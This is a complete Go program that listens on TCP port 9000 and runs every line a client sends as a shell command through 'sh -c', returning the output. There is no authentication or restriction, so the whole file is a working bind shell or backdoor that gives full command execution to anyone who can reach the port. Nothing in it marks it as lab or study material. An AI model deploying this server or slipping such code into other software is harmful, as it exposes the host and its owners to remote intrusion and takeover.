package main

import (
	"bufio"
	"fmt"
	"net"
	"os/exec"
)

const port = "9000"

func handleConnection(conn net.Conn) {
	defer conn.Close()
	fmt.Println("Client connected:", conn.RemoteAddr())

	reader := bufio.NewReader(conn)

	for {
		command, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("Client disconected")
			return
		}

		command = command[:len(command)-1] // Cut \n
		fmt.Println("Run command:", command)

		// Run command in system
		cmd := exec.Command("sh", "-c", command)
		output, err := cmd.CombinedOutput()

		if err != nil {
			conn.Write([]byte("Error exceprion: " + err.Error() + "\n"))
		}

		conn.Write(output)
	}
}

func main() {
	listener, err := net.Listen("tcp", ":"+port)
	if err != nil {
		fmt.Println("Server run error:", err)
		return
	}
	defer listener.Close()

	fmt.Println("Server wait connection on port:", port)

	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println("Connection error:", err)
			continue
		}
		go handleConnection(conn)
	}
}